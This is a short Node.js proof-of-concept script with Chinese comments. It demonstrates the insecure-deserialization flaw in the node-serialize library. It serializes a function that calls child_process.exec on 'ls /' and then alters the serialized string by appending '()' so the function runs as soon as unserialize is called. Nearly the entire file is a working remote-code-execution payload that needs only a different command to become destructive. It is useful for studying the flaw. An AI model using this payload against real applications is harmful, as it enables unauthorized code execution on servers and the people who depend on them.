var serialize = require('node-serialize')

var test = {
  rce: function() {
    require('child_process').exec('ls /', function(error, stdout, stderr) {
      console.log(stdout)
    })
  }
}

// 序列化
var payload = serialize.serialize(test)
console.log(payload)

// 让 _$$ND_FUNC$$_function 可执行
payload = payload.replace('}"}', '}()"}')
serialize.unserialize(payload)
